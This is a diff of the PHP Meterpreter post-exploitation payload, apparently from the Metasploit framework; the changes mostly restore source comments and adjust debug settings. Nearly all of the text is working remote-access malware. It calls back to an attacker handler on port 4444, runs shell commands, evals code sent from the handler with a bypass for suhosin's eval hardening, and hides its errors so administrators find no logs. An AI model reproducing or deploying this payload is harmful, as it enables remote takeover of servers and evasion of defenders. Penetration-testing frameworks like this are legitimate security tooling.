@@ -1,36 +1,36 @@
 /*<?php /**/
 
+# Everything that needs to be global has to be made so explicitly so we can run
+# inside a call to create_user_func($user_input);
 
-
-
-
+# global list of channels
 if (!isset($GLOBALS['channels'])) {
   $GLOBALS['channels'] = array();
 }
 
-
-
+# global mapping of channels to channelized processes.  This is how we know
+# if we need to kill a process when it's channel has been closed.
 if (!isset($GLOBALS['channel_process_map'])) {
   $GLOBALS['channel_process_map'] = array();
 }
 
-
-
+# global resource map.  This is how we know whether to use socket or stream
+# functions on a channel.
 if (!isset($GLOBALS['resource_type_map'])) {
   $GLOBALS['resource_type_map'] = array();
 }
 
-
+# global map of sockets to the associated peer host.
 if (!isset($GLOBALS['udp_host_map'])) {
   $GLOBALS['udp_host_map'] = array();
 }
 
-
+# global list of resources we need to watch in the main select loop
 if (!isset($GLOBALS['readers'])) {
   $GLOBALS['readers'] = array();
 }
 
-
+# global map of command ids to callable handlers
 if (!isset($GLOBALS['id2f'])) {
   $GLOBALS['id2f'] = array();
 }
@@ -42,8 +42,8 @@ function register_command($c, $i) {
   }
 }
 
-
-define("MY_DEBUGGING", true);
+# Debugging payload definitions
+define("MY_DEBUGGING", false);
 define("MY_DEBUGGING_LOG_FILE_PATH", false);
 
 function my_logfile($str) {
@@ -64,36 +64,16 @@ function my_logfile($str) {
 
 function my_print($str) {
   if (MY_DEBUGGING) {
-    error_log($str);
-    my_logfile($str);
+    $time = date('c');
+    error_log($time . ' ' . $str);
+    my_logfile($time . ' ' . $str);
   }
 }
 
 my_print("Evaling main meterpreter stage");
 
-if (MY_DEBUGGING) {
-  if (!isset($GLOBALS['my_shutdown_handler'])) {
-    $GLOBALS['my_shutdown_handler'] = true;
-
-    if (function_exists("register_shutdown_function")) {
-      function my_shutdown_handler() {
-        my_print("shutdown called");
-        $error = error_get_last();
-
-        if($error !== NULL) {
-          dump_array($error);
-        }
-      }
-
-      register_shutdown_function("my_shutdown_handler");
-    }
-  }
-}
-
-
-
-
-
+# Be very careful not to put a # anywhere that isn't a comment (e.g. inside a
+# string) as the comment remover will completely break this payload
 
 function dump_array($arr, $name=null) {
   if (is_null($name)) {
@@ -102,7 +82,7 @@ function dump_array($arr, $name=null) {
   my_print(sprintf("$name (%s)", count($arr)));
   foreach ($arr as $key => $val) {
     if (is_array($val)) {
-      
+      # recurse
       dump_array($val, "{$name}[{$key}]");
     } else {
       my_print(sprintf("    $key ($val)"));
@@ -123,7 +103,7 @@ function dump_channels($extra="") {
 }
 
 
-
+# Doesn't exist before php 4.3
 if (!function_exists("file_get_contents")) {
   function file_get_contents($file) {
     $f = @fopen($file,"rb");
@@ -136,22 +116,22 @@ if (!function_exists("file_get_contents")) {
   }
 }
 
-
+# Renamed in php 4.3
 if (!function_exists('socket_set_option')) {
   function socket_set_option($sock, $type, $opt, $value) {
     socket_setopt($sock, $type, $opt, $value);
   }
 }
 
+#
+# Payload definitions
+#
+define("PAYLOAD_UUID", "");
+define("SESSION_GUID", "");
 
-
-
-define("PAYLOAD_UUID", "\x9f\x2a\xd6\x74\x23\xeb\x5b\xf0\x74\x80\x67\x8f\x10\xf2\x6a\x9b");
-define("SESSION_GUID", "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00");
-
-
-
-
+#
+# Constants
+#
 define("AES_256_CBC", 'aes-256-cbc');
 define("ENC_NONE", 0);
 define("ENC_AES256", 1);
@@ -170,15 +150,15 @@ define("CHANNEL_CLASS_DATAGRAM", 2);
 define("CHANNEL_CLASS_POOL",     3);
 
 
-
-
-
+##
+# Windows Constants
+##
 define("WIN_AF_INET", 2);
 define("WIN_AF_INET6", 23);
 
-
-
-
+#
+# TLV Meta Types
+#
 define("TLV_META_TYPE_NONE",       (   0   ));
 define("TLV_META_TYPE_STRING",     (1 << 16));
 define("TLV_META_TYPE_UINT",       (1 << 17));
@@ -188,21 +168,21 @@ define("TLV_META_TYPE_QWORD",      (1 << 20));
 define("TLV_META_TYPE_COMPRESSED", (1 << 29));
 define("TLV_META_TYPE_GROUP",      (1 << 30));
 define("TLV_META_TYPE_COMPLEX",    (1 << 31));
-
+# not defined in original
 define("TLV_META_TYPE_MASK",    (1<<31)+(1<<30)+(1<<29)+(1<<19)+(1<<18)+(1<<17)+(1<<16));
 
-
-
-
+#
+# TLV base starting points
+#
 define("TLV_RESERVED",   0);
 define("TLV_EXTENSIONS", 20000);
 define("TLV_USER",       40000);
 define("TLV_TEMP",       60000);
 
 
-
-
-
+#
+# TLV Specific Types
+#
 define("TLV_TYPE_ANY",                 TLV_META_TYPE_NONE   |   0);
 define("TLV_TYPE_COMMAND_ID",          TLV_META_TYPE_UINT   |   1);
 define("TLV_TYPE_REQUEST_ID",          TLV_META_TYPE_STRING |   2);
@@ -237,15 +217,15 @@ define("TLV_TYPE_MACHINE_ID",          TLV_META_TYPE_STRING | 460);
 define("TLV_TYPE_UUID",                TLV_META_TYPE_RAW    | 461);
 define("TLV_TYPE_SESSION_GUID",        TLV_META_TYPE_RAW    | 462);
 
-
+# Packet encryption
 define("TLV_TYPE_RSA_PUB_KEY",         TLV_META_TYPE_RAW    | 550);
 define("TLV_TYPE_SYM_KEY_TYPE",        TLV_META_TYPE_UINT   | 551);
 define("TLV_TYPE_SYM_KEY",             TLV_META_TYPE_RAW    | 552);
 define("TLV_TYPE_ENC_SYM_KEY",         TLV_META_TYPE_RAW    | 553);
 
-
-
-
+# ---------------------------------------------------------------
+# --- THIS CONTENT WAS GENERATED BY A TOOL @ 2020-05-01 05:33:39 UTC
+# IDs for core
 define('EXTENSION_ID_CORE', 0);
 define('COMMAND_ID_CORE_CHANNEL_CLOSE', 1);
 define('COMMAND_ID_CORE_CHANNEL_EOF', 2);
@@ -280,7 +260,7 @@ define('COMMAND_ID_CORE_TRANSPORT_REMOVE', 30);
 define('COMMAND_ID_CORE_TRANSPORT_SETCERTHASH', 31);
 define('COMMAND_ID_CORE_TRANSPORT_SET_TIMEOUTS', 32);
 define('COMMAND_ID_CORE_TRANSPORT_SLEEP', 33);
-
+# ---------------------------------------------------------------
 
 function my_cmd($cmd) {
   return shell_exec($cmd);
@@ -290,9 +270,9 @@ function is_windows() {
   return (strtoupper(substr(PHP_OS,0,3)) == "WIN");
 }
 
-
-
-
+##
+# Worker functions
+##
 
 if (!function_exists('core_channel_open')) {
   register_command('core_channel_open', COMMAND_ID_CORE_CHANNEL_OPEN);
@@ -301,8 +281,8 @@ if (!function_exists('core_channel_open')) {
 
     my_print("Client wants a ". $type_tlv['value'] ." channel, i'll see what i can do");
 
-    
-    
+    # Doing it this way allows extensions to create new channel types without
+    # needing to modify the core code.
     $handler = "channel_create_". $type_tlv['value'];
     if ($type_tlv['value'] && is_callable($handler)) {
       my_print("Calling {$handler}");
@@ -316,7 +296,7 @@ if (!function_exists('core_channel_open')) {
   }
 }
 
-
+# Works for streams
 if (!function_exists('core_channel_eof')) {
   register_command('core_channel_eof', COMMAND_ID_CORE_CHANNEL_EOF);
   function core_channel_eof($req, &$pkt) {
@@ -337,7 +317,7 @@ if (!function_exists('core_channel_eof')) {
   }
 }
 
-
+# Works
 if (!function_exists('core_channel_read')) {
   register_command('core_channel_read', COMMAND_ID_CORE_CHANNEL_READ);
   function core_channel_read($req, &$pkt) {
@@ -357,11 +337,11 @@ if (!function_exists('core_channel_read')) {
   }
 }
 
-
+# Works
 if (!function_exists('core_channel_write')) {
   register_command('core_channel_write', COMMAND_ID_CORE_CHANNEL_WRITE);
   function core_channel_write($req, &$pkt) {
-    
+    #my_print("doing channel write");
     $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
     $data_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_DATA);
     $len_tlv = packet_get_tlv($req, TLV_TYPE_LENGTH);
@@ -379,31 +359,31 @@ if (!function_exists('core_channel_write')) {
   }
 }
 
-
-
-
+#
+# This is called when the client wants to close a channel explicitly.
+#
 if (!function_exists('core_channel_close')) {
   register_command('core_channel_close', COMMAND_ID_CORE_CHANNEL_CLOSE);
   function core_channel_close($req, &$pkt) {
     global $channel_process_map;
-    
+    # XXX remove the closed channel from $readers
     my_print("doing channel close");
     $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
     $id = $chan_tlv['value'];
 
     $c = get_channel_by_id($id);
     if ($c) {
-      
+      # We found a channel, close its stdin/stdout/stderr
       channel_close_handles($id);
 
-      
-      
+      # This is an explicit close from the client, always remove it from the
+      # list, even if it has data.
       channel_remove($id);
 
-      
-      
-      
-      
+      # if the channel we're closing is associated with a process, kill the
+      # process
+      # Make sure the stdapi function for closing a process handle is
+      # available before trying to clean up
       if (array_key_exists($id, $channel_process_map) and is_callable('close_process')) {
         close_process($channel_process_map[$id]);
       }
@@ -415,29 +395,29 @@ if (!function_exists('core_channel_close')) {
   }
 }
 
-
-
-
+#
+# Destroy a channel and all associated handles.
+#
 if (!function_exists('channel_close_handles')) {
   function channel_close_handles($cid) {
     global $channels;
 
-    
+    # Sanity check - make sure a channel with the given cid exists
     if (!array_key_exists($cid, $channels)) {
       return;
     }
     $c = $channels[$cid];
     for($i = 0; $i < 3; $i++) {
-      
+      #my_print("closing channel fd $i, {$c[$i]}");
       if (array_key_exists($i, $c) && is_resource($c[$i])) {
         close($c[$i]);
-        
-        
+        # Make sure the main loop doesn't select on this resource after we
+        # close it.
         remove_reader($c[$i]);
       }
     }
 
-    
+    # axe it from the list only if it doesn't have any leftover data
     if (strlen($c['data']) == 0) {
       channel_remove($cid);
     }
@@ -458,46 +438,46 @@ if (!function_exists('core_channel_interact')) {
     $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
     $id = $chan_tlv['value'];
 
-    
+    # True means start interacting, False means stop
     $toggle_tlv = packet_get_tlv($req, TLV_TYPE_BOOL);
 
     $c = get_channel_by_id($id);
     if ($c) {
       if ($toggle_tlv['value']) {
-        
-        
+        # Start interacting.  If we're already interacting with this
+        # channel, it's an error and we should return failure.
         if (!in_array($c[1], $readers)) {
-          
+          # stdout
           add_reader($c[1]);
-          
-          
+          # Make sure we don't add the same resource twice in the case
+          # that stdin == stderr
           if (array_key_exists(2, $c) && $c[1] != $c[2]) {
-            
+            # stderr
             add_reader($c[2]);
           }
           $ret = ERROR_SUCCESS;
         } else {
-          
+          # Already interacting
           $ret = ERROR_FAILURE;
         }
       } else {
-        
-        
+        # Stop interacting.  If we're not interacting yet with this
+        # channel, it's an error and we should return failure.
         if (in_array($c[1], $readers)) {
-          remove_reader($c[1]); 
-          remove_reader($c[2]); 
+          remove_reader($c[1]); # stdout
+          remove_reader($c[2]); # stderr
           $ret = ERROR_SUCCESS;
         } else {
-          
-          
-          
-          
-          
+          # Not interacting.  This is technically failure, but it seems
+          # the client sends us two of these requests in quick succession
+          # causing the second one to always return failure.  When that
+          # happens we fail to clean up properly, so always return
+          # success here.
           $ret = ERROR_SUCCESS;
         }
       }
     } else {
-      
+      # Not a valid channel
       my_print("Trying to interact with an invalid channel");
       $ret = ERROR_FAILURE;
     }
@@ -523,9 +503,9 @@ if (!function_exists('core_shutdown')) {
   }
 }
 
-
-
-
+# zlib support is not compiled in by default, so this makes sure the library
+# isn't compressed before eval'ing it
+# TODO: check for zlib support and decompress if possible
 if (!function_exists('core_loadlib')) {
   register_command('core_loadlib', COMMAND_ID_CORE_LOADLIB);
   function core_loadlib($req, &$pkt) {
@@ -536,10 +516,10 @@ if (!function_exists('core_loadlib')) {
       return ERROR_FAILURE;
     }
     $tmp = $id2f;
-    
-    
-    
-    
+    # We might not be able to use `eval` here because of some hardening
+    # (for example, suhosin), so we walk around by using `create_function` instead,
+    # but since this funcis deprecated since php 7.2+, we're not using it
+    # when we can avoid it, since it might leave some traces in the log files.
     if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) {
       $suhosin_bypass=create_function('', $data_tlv['value']);
       $suhosin_bypass();
@@ -631,7 +611,7 @@ if (!function_exists('core_negotiate_tlv_encryption')) {
         }
       }
 
-      
+      # add the raw aes key at this point as it means the encrypt version didn't go out.
       packet_add_tlv($pkt, create_tlv(TLV_TYPE_SYM_KEY, $GLOBALS['AES_KEY']));
     }
     return ERROR_SUCCESS;
@@ -664,7 +644,7 @@ if (!function_exists('core_machine_id')) {
   function core_machine_id($req, &$pkt) {
     my_print("doing core_machine_id");
     if (is_callable('gethostname')) {
-      
+      # introduced in 5.3
       $machine_id = gethostname();
     } else {
       $machine_id = php_uname('n');
@@ -672,8 +652,8 @@ if (!function_exists('core_machine_id')) {
     $serial = "";
 
     if (is_windows()) {
-      
-      
+      # It's dirty, but there's not really a nicer way of doing this on windows. Make sure
+      # it's lowercase as this is what the other meterpreters use.
       $output = strtolower(shell_exec("vol %SYSTEMDRIVE%"));
       $serial = preg_replace('/.*serial number is ([a-z0-9]{4}-[a-z0-9]{4}).*/s', '$1', $output);
     } else {
@@ -685,9 +665,9 @@ if (!function_exists('core_machine_id')) {
   }
 
 
-  
-  
-  
+  ##
+  # Channel Helper Functions
+  ##
 }
 $channels = array();
 
@@ -697,27 +677,27 @@ function register_channel($in, $out=null, $err=null) {
   if ($err == null) { $err = $out; }
   $channels[] = array(0 => $in, 1 => $out, 2 => $err, 'type' => get_rtype($in), 'data' => '');
 
-  
+  # Grab the last index and use it as the new ID.
   $id = end(array_keys($channels));
   my_print("Created new channel $in, with id $id");
   return $id;
 }
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+#
+# Channels look like this:
+#
+# Array
+# (
+#   [0] => Array
+#       (
+#            [0] => Resource id #12
+#            [1] => Resource id #13
+#            [2] => Resource id #14
+#            [type] => 'stream'
+#            [data] => '...'
+#       )
+# )
+#
 function get_channel_id_from_resource($resource) {
   global $channels;
   if (empty($channels)) {
@@ -735,7 +715,7 @@ function get_channel_id_from_resource($resource) {
 function &get_channel_by_id($chan_id) {
   global $channels;
   my_print("Looking up channel id $chan_id");
-  dump_channels("in get_channel_by_id");
+  #dump_channels("in get_channel_by_id");
   if (array_key_exists($chan_id, $channels)) {
     my_print("Found one");
     return $channels[$chan_id];
@@ -744,50 +724,49 @@ function &get_channel_by_id($chan_id) {
   }
 }
 
-
+# Write data to the channel's stdin
 function channel_write($chan_id, $data) {
   $c = get_channel_by_id($chan_id);
   if ($c && is_resource($c[0])) {
     my_print("---Writing '$data' to channel $chan_id");
-    dump_array($c);
     return write($c[0], $data);
   } else {
     return false;
   }
 }
 
-
+# Read from the channel's stdout
 function channel_read($chan_id, $len) {
   $c = &get_channel_by_id($chan_id);
   if ($c) {
-    
+    # First get any pending unread data from a previous read
     $ret = substr($c['data'], 0, $len);
     $c['data'] = substr($c['data'], $len);
     if (strlen($ret) > 0) { my_print("Had some leftovers: '$ret'"); }
 
-    
-    
+    # Next grab stderr if we have it and it's not the same file descriptor
+    # as stdout.
     if (strlen($ret) < $len and is_resource($c[2]) and $c[1] != $c[2]) {
-      
+      # Read as much as possible into the channel's data buffer
       $read = read($c[2]);
       $c['data'] .= $read;
 
-      
-      
-      
-      
-      
-      
+      # Now slice out however much the client asked for.  If there's any
+      # left over, they'll get it next time.  If it doesn't add up to
+      # what they requested, oh well, they'll just have to call read
+      # again. Looping until we get the requested number of bytes is
+      # inconsistent with win32 meterpreter and causes the whole php
+      # process to block waiting on input.
       $bytes_needed = $len - strlen($ret);
       $ret .= substr($c['data'], 0, $bytes_needed);
       $c['data'] = substr($c['data'], $bytes_needed);
     }
 
-    
+    # Then if there's still room, grab stdout
     if (strlen($ret) < $len and is_resource($c[1])) {
-      
-      
-      
+      # Same as above, but for stdout.  This will overwrite a false
+      # return value from reading stderr but the two should generally
+      # EOF at the same time, so it should be fine.
       $read = read($c[1]);
       $c['data'] .= $read;
       $bytes_needed = $len - strlen($ret);
@@ -795,11 +774,11 @@ function channel_read($chan_id, $len) {
       $c['data'] = substr($c['data'], $bytes_needed);
     }
 
-    
-    
-    
-    
-    
+    # In the event of one or the other of the above read()s returning
+    # false, make sure we have sent any pending unread data before saying
+    # EOF by returning false.  Note that if they didn't return false, it is
+    # perfectly legitimate to return an empty string which just means
+    # there's no data right now but we haven't hit EOF yet.
     if (false === $read and empty($ret)) {
       if (interacting($chan_id)) {
         handle_dead_resource_channel($c[1]);
@@ -839,9 +818,9 @@ function xor_bytes($key, $data) {
 }
 
 
-
-
-
+##
+# TLV Helper Functions
+##
 
 function generate_req_id() {
   $characters = 'abcdefghijklmnopqrstuvwxyz';
@@ -885,7 +864,7 @@ function encrypt_packet($raw) {
 
 function write_tlv_to_socket($resource, $raw) {
   $xor = rand_xor_key();
-  
+  # default to unecrypted traffic
   write($resource, $xor . xor_bytes($xor, encrypt_packet($raw)));
 }
 
@@ -900,24 +879,24 @@ function handle_dead_resource_channel($resource) {
   if ($cid === false) {
     my_print("Resource has no channel: {$resource}");
 
-    
-    
+    # Make sure the provided resource gets closed regardless of it's status
+    # as a channel
     remove_reader($resource);
     close($resource);
   } else {
     my_print("Handling dead resource: {$resource}, for channel: {$cid}");
 
-    
+    # Make sure we close other handles associated with this channel as well
     channel_close_handles($cid);
 
-    
+    # Notify the client that this channel is dead
     $pkt = pack("N", PACKET_TYPE_REQUEST);
     packet_add_tlv($pkt, create_tlv(TLV_TYPE_COMMAND_ID, COMMAND_ID_CORE_CHANNEL_CLOSE));
     packet_add_tlv($pkt, create_tlv(TLV_TYPE_REQUEST_ID, generate_req_id()));
     packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $cid));
     packet_add_tlv($pkt, create_tlv(TLV_TYPE_UUID, $GLOBALS['UUID']));
 
-    
+    # Add the length to the beginning of the packet
     $pkt = pack("N", strlen($pkt) + 4) . $pkt;
     write_tlv_to_socket($msgsock, $pkt);
   }
@@ -928,7 +907,7 @@ function handle_resource_read_channel($resource, $data) {
   $cid = get_channel_id_from_resource($resource);
   my_print("Handling data from $resource");
 
-  
+  # Build a new Packet
   $pkt = pack("N", PACKET_TYPE_REQUEST);
   packet_add_tlv($pkt, create_tlv(TLV_TYPE_COMMAND_ID, COMMAND_ID_CORE_CHANNEL_WRITE));
   if (array_key_exists((int)$resource, $udp_host_map)) {
@@ -942,7 +921,7 @@ function handle_resource_read_channel($resource, $data) {
   packet_add_tlv($pkt, create_tlv(TLV_TYPE_REQUEST_ID, generate_req_id()));
   packet_add_tlv($pkt, create_tlv(TLV_TYPE_UUID, $GLOBALS['UUID']));
 
-  
+  # Add the length to the beginning of the packet
   $pkt = pack("N", strlen($pkt) + 4) . $pkt;
   return $pkt;
 }
@@ -969,7 +948,7 @@ function create_response($req) {
   packet_add_tlv($pkt, create_tlv(TLV_TYPE_RESULT, $result));
   packet_add_tlv($pkt, create_tlv(TLV_TYPE_UUID, $GLOBALS['UUID']));
 
-  
+  # Add the length to the beginning of the packet
   $pkt = pack("N", strlen($pkt) + 4) . $pkt;
   return $pkt;
 }
@@ -980,7 +959,7 @@ function create_tlv($type, $val) {
 
 function tlv_pack($tlv) {
   $ret = "";
-  
+  #my_print("Creating a tlv of type: {$tlv['type']}");
   if (($tlv['type'] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING) {
     $ret = pack("NNa*", 8 + strlen($tlv['value'])+1, $tlv['type'], $tlv['value'] . "\0");
   }
@@ -993,7 +972,7 @@ function tlv_pack($tlv) {
     $ret = pack("NNN", 8 + 4, $tlv['type'], $tlv['value']);
   }
   elseif (($tlv['type'] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL) {
-    
+    # PHP's pack appears to be busted for chars,
     $ret = pack("NN", 8 + 1, $tlv['type']);
     $ret .= $tlv['value'] ? "\x01" : "\x00";
   }
@@ -1001,11 +980,11 @@ function tlv_pack($tlv) {
     $ret = pack("NN", 8 + strlen($tlv['value']), $tlv['type']) . $tlv['value'];
   }
   elseif (($tlv['type'] & TLV_META_TYPE_GROUP) == TLV_META_TYPE_GROUP) {
-    
+    # treat groups the same as raw
     $ret = pack("NN", 8 + strlen($tlv['value']), $tlv['type']) . $tlv['value'];
   }
   elseif (($tlv['type'] & TLV_META_TYPE_COMPLEX) == TLV_META_TYPE_COMPLEX) {
-    
+    # treat complex the same as raw
     $ret = pack("NN", 8 + strlen($tlv['value']), $tlv['type']) . $tlv['value'];
   }
   else {
@@ -1020,8 +999,8 @@ function tlv_unpack($raw_tlv) {
   my_print("len: {$tlv['len']}, type: {$tlv['type']}");
   if (($type & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING) {
     $tlv = unpack("Nlen/Ntype/a*value", substr($raw_tlv, 0, $tlv['len']));
-    
-    
+    # PHP 5.5.0 modifed the 'a' unpack format to stop removing the trailing
+    # NULL, so catch that here
     $tlv['value'] = str_replace("\0", "", $tlv['value']);
   }
   elseif (($type & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT) {
@@ -1050,29 +1029,29 @@ function packet_add_tlv(&$pkt, $tlv) {
 }
 
 function packet_get_tlv($pkt, $type) {
-  
-  
+  #my_print("Looking for a tlv of type $type");
+  # Start at offset 8 to skip past the packet header
   $offset = 8;
   while ($offset < strlen($pkt)) {
     $tlv = tlv_unpack(substr($pkt, $offset));
-    
+    #my_print("len: {$tlv['len']}, type: {$tlv['type']}");
     if ($type == ($tlv['type'] & ~TLV_META_TYPE_COMPRESSED)) {
-      
+      #my_print("Found one at offset $offset");
       return $tlv;
     }
     $offset += $tlv['len'];
   }
-  
-  
-  
-  
+  #my_print("Didn't find one, wtf");
+  # We should return null instead of false, because false is actually
+  # a valid value for a TLV and hence it's not possible to determine
+  # a missing BOOL tlv value.
   return null;
 }
 
 
 function packet_get_all_tlvs($pkt, $type) {
   my_print("Looking for all tlvs of type $type");
-  
+  # Start at offset 8 to skip past the packet header
   $offset = 8;
   $all = array();
   while ($offset < strlen($pkt)) {
@@ -1091,9 +1070,9 @@ function packet_get_all_tlvs($pkt, $type) {
 }
 
 
-
-
-
+##
+# Functions for genericizing the stream/socket conundrum
+##
 
 
 function register_socket($sock, $ipaddr=null, $port=null) {
@@ -1102,18 +1081,18 @@ function register_socket($sock, $ipaddr=null, $port=null) {
   $resource_type_map[(int)$sock] = 'socket';
   if ($ipaddr) {
     $udp_host_map[(int)$sock] = array($ipaddr, $port);
-    
+    #dump_array($udp_host_map, "UDP Map after registering a new socket");
   }
 }
 
-
+# The stream functions cannot be unconnected, so don't require a host map
 function register_stream($stream, $ipaddr=null, $port=null) {
   global $resource_type_map, $udp_host_map;
   my_print("Registering stream $stream for ($ipaddr:$port)");
   $resource_type_map[(int)$stream] = 'stream';
   if ($ipaddr) {
     $udp_host_map[(int)$stream] = array($ipaddr, $port);
-    
+    #dump_array($udp_host_map, "UDP Map after registering a new stream");
   }
 }
 
@@ -1121,9 +1100,9 @@ function connect($ipaddr, $port, $proto='tcp') {
   my_print("Doing connect($ipaddr, $port)");
   $sock = false;
 
-  
-  
-  
+  # IPv6 requires brackets around the address in some cases, but not all.
+  # Keep track of the un-bracketed address for the functions that don't like
+  # brackets, specifically socket_connect and socket_sendto.
   $ipf = WIN_AF_INET;
   $raw_ip = $ipaddr;
   if (FALSE !== strpos($ipaddr, ":")) {
@@ -1131,8 +1110,8 @@ function connect($ipaddr, $port, $proto='tcp') {
     $ipaddr = "[". $raw_ip ."]";
   }
 
-  
-  
+  # Prefer the stream versions so we don't have to use both select functions
+  # unnecessarily, but fall back to socket_create if they aren't available.
   if (is_callable('stream_socket_client')) {
     my_print("stream_socket_client({$proto}://{$ipaddr}:{$port})");
     if ($proto == 'ssl') {
@@ -1189,24 +1168,24 @@ function connect($ipaddr, $port, $proto='tcp') {
 function eof($resource) {
   $ret = false;
   switch (get_rtype($resource)) {
-    
+    # XXX Doesn't work with sockets.
   case 'socket': break;
   case 'stream':
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
+    # We set the socket timeout for streams opened with fsockopen() when
+    # they are created. I hope this is enough to deal with hangs when
+    # calling feof() on socket streams, but who knows. This is PHP,
+    # anything could happen. Some day they'll probably add a new function
+    # called stream_eof() and it will handle sockets properly except for
+    # some edge case that happens for every socket except the one or two
+    # they tested it on and it will always return false on windows and
+    # later they'll rename it to real_stream_eof_this_language_isretarded().
+    #
+    # See http://us2.php.net/manual/en/function.feof.php , specifically this:
+    #   If a connection opened by fsockopen() wasn't closed by the server,
+    #   feof() will hang. To workaround this, see below example:
+    #     <?php
+    #     function safe_feof($fp, &$start = NULL) {
+    #     ...
     $ret = feof($resource);
     break;
   }
@@ -1222,7 +1201,7 @@ function close($resource) {
   case 'socket': $ret = socket_close($resource); break;
   case 'stream': $ret = fclose($resource); break;
   }
-  
+  # Every resource should be in the resource type map, but check anyway
   if (array_key_exists((int)$resource, $resource_type_map)) {
     unset($resource_type_map[(int)$resource]);
   }
@@ -1235,12 +1214,12 @@ function close($resource) {
 
 function read($resource, $len=null) {
   global $udp_host_map;
-  
-  
-  
-  
+  # Max packet length is magic.  If we're reading a pipe that has data but
+  # isn't going to generate any more without some input, then reading less
+  # than all bytes in the buffer or 8192 bytes, the next read will never
+  # return.
   if (is_null($len)) { $len = 8192; }
-  
+  #my_print(sprintf("Reading from $resource which is a %s", get_rtype($resource)));
   $buff = '';
   switch (get_rtype($resource)) {
   case 'socket':
@@ -1255,16 +1234,16 @@ function read($resource, $len=null) {
     break;
   case 'stream':
     global $msgsock;
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
+    # Calling select here should ensure that we never try to read from a socket
+    # or pipe that doesn't currently have data.  If that ever happens, the
+    # whole php process will block waiting for data that may never come.
+    # Unfortunately, selecting on pipes created with proc_open on Windows
+    # always returns immediately.  Basically, shell interaction in Windows
+    # is hosed until this gets figured out.
+    #
+    # From the documentation:
+    # > Use of stream_select() on file descriptors returned by proc_open()
+    #   will fail and return FALSE under Windows.
     $r = Array($resource);
     my_print("Calling select to see if there's data on $resource");
     $last_requested_len = 0;
@@ -1272,14 +1251,14 @@ function read($resource, $len=null) {
       $w=NULL;$e=NULL;$t=0;
       $cnt = stream_select($r, $w, $e, $t);
 
-      
-      
+      # Stream is not ready to read, have to live with what we've gotten
+      # so far
       if ($cnt === 0) {
         break;
       }
 
-      
-      
+      # if stream_select returned false, something is wrong with the
+      # socket or the syscall was interrupted or something.
       if ($cnt === false or feof($resource)) {
         my_print("Checking for failed read...");
         if (empty($buff)) {
@@ -1310,8 +1289,8 @@ function read($resource, $len=null) {
     my_print(sprintf("Done with the big read loop on $resource, got %d bytes, asked for %d bytes", strlen($buff), $last_requested_len));
     break;
   default:
-    
-    
+    # then this is possibly a closed channel resource, see if we have any
+    # data from previous reads
     $cid = get_channel_id_from_resource($resource);
     $c = get_channel_by_id($cid);
     if ($c and $c['data']) {
@@ -1333,7 +1312,7 @@ function read($resource, $len=null) {
 function write($resource, $buff, $len=0) {
   global $udp_host_map;
   if ($len == 0) { $len = strlen($buff); }
-  
+  #my_print(sprintf("Writing $len bytes to $resource which is a %s", get_rtype($resource)));
   $count = false;
   switch (get_rtype($resource)) {
   case 'socket':
@@ -1401,13 +1380,13 @@ function select(&$r, &$w, &$e, $tv_sec=0, $tv_usec=0) {
 
   $n_sockets = count($sockets_r) + count($sockets_w) + count($sockets_e);
   $n_streams = count($streams_r) + count($streams_w) + count($streams_e);
-  
+  #my_print("Selecting $n_sockets sockets and $n_streams streams with timeout $tv_sec.$tv_usec");
   $r = array();
   $w = array();
   $e = array();
 
-  
-  
+  # Workaround for some versions of PHP that throw an error and bail out if
+  # select is given an empty array
   if (count($sockets_r)==0) { $sockets_r = null; }
   if (count($sockets_w)==0) { $sockets_w = null; }
   if (count($sockets_e)==0) { $sockets_e = null; }
@@ -1432,7 +1411,7 @@ function select(&$r, &$w, &$e, $tv_sec=0, $tv_usec=0) {
     if (is_array($e) && is_array($streams_e)) { $e = array_merge($e, $streams_e); }
     $count += $res;
   }
-  
+  #my_print(sprintf("total: $count, Modified counts: r=%s w=%s e=%s", count($r), count($w), count($e)));
   return $count;
 }
 
@@ -1445,8 +1424,8 @@ function add_reader($resource) {
 
 function remove_reader($resource) {
   global $readers;
-  
-  
+  #my_print("Removing reader: $resource");
+  #dump_readers();
   if (in_array($resource, $readers)) {
     foreach ($readers as $key => $r) {
       if ($r == $resource) {
@@ -1457,14 +1436,14 @@ function remove_reader($resource) {
 }
 
 
-
-
-
+##
+# Main stuff
+##
 
 ob_implicit_flush();
 
-
-
+# Turn off error reporting so we don't leave any ugly logs.  Why make an
+# administrator's job easier if we don't have to?  =)
 if (MY_DEBUGGING) {
   error_reporting(E_ALL);
 } else {
@@ -1472,31 +1451,31 @@ if (MY_DEBUGGING) {
 }
 
 @ignore_user_abort(true);
-
+# Has no effect in safe mode, but try anyway
 @set_time_limit(0);
 @ignore_user_abort(1);
 @ini_set('max_execution_time',0);
 
-
-
+# Add the payload UUID to globals, and use that from now on so that we can
+# update it as required.
 $GLOBALS['UUID'] = PAYLOAD_UUID;
 $GLOBALS['SESSION_GUID'] = SESSION_GUID;
 $GLOBALS['AES_KEY'] = null;
 $GLOBALS['AES_ENABLED'] = false;
 
-
-
+# If we don't have a socket we're standalone, setup the connection here.
+# Otherwise, this is a staged payload, don't bother connecting
 if (!isset($GLOBALS['msgsock'])) {
-  
-  
+  # The payload handler overwrites this with the correct LHOST before sending
+  # it to the victim.
   $ipaddr = '127.0.0.1';
   $port = 4444;
   my_print("Don't have a msgsock, trying to connect($ipaddr, $port)");
   $msgsock = connect($ipaddr, $port);
   if (!$msgsock) { die(); }
 } else {
-  
-  
+  # The ABI for PHP stagers is a socket in $msgsock and it's type (socket or
+  # stream) in $msgsock_type
   $msgsock = $GLOBALS['msgsock'];
   $msgsock_type = $GLOBALS['msgsock_type'];
   switch ($msgsock_type) {
